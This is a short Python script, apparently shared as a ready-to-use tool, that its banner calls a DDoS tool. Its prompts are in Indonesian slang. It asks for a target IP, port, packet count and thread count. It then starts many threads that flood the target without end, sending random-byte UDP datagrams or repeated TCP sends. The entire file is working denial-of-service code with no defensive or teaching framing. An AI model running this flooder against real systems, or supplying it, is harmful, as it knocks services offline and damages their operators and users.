#!/usr/bin/env python3
#Code by Rence
import random
import socket
import threading

print("~~~ DDOS TOOLS STAY HALAL BROTHER ~~~")
ip = str(input(" IP SERVER:"))
port = int(input(" PORT SERVER:"))
choice = str(input(" SIAP JADI KANG DDOS?(y/n):"))
times = int(input(" Lu mau kirim paket sebanyak:"))
threads = int(input(" Mau berapa banyak HADIAH:"))
def run():
	data = random._urandom(1024)
	D = random.choice(("[Devilz]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(D +" ATTACKING SERVER!!!")
		except:
			print("[×] DDOS GAGAL!!!")

def run2():
	data = random._urandom(16)
	D = random.choice(("[Devilz]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(D +" ATTACKING SERVER!!!")
		except:
			s.close()
			print("[×] DDOS GAGAL!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()